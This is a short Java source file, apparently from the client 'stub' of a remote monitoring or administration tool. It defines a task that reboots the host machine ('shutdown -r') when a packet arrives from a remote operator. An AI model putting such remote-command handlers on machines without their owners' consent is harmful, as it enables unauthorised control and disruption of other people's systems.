package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;

import java.io.IOException;

/**
 * Created by Josh on 4/07/2015.
 * TODO: Needs to be tested on Mac and Linux
 */
public class RebootClientSystemTask extends PacketTask {

    public RebootClientSystemTask() {
        super(Packets.RESTART_CLIENT_SYSTEM.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        Runtime.getRuntime().exec("shutdown -r");
    }
}
